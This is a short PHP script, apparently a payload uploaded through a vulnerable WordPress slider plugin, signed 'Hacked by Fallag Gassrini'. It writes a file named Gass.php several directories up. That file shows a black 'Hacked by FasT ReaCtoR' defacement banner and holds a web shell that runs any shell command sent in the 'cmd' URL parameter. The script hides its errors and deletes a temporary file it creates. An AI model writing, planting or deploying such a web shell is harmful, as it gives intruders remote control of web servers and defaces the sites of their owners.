<?php 
echo "[syslog]01\n";
error_reporting(0);

$file  = '<style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}</style><title>Hacked by FasT ReaCtoR</title><center><div id=q>Hacked by FasT ReaCtoR<br>
<?php system("$_GET[cmd]");echo "<br>O_O";exit; ?>';
$r=fopen("../../../../../../Gass.php", "w");fwrite($r,$file);fclose($r);
echo "[syslog]02\n";
$r=fopen("x.php", "w");fwrite($r,"");fclose($r);
// system ("rm ../revslider.zip");
if(file_exists("x.php")) unlink("x.php");
echo "[syslog]03\n";
?>
?> Hacked by Fallag Gassrini
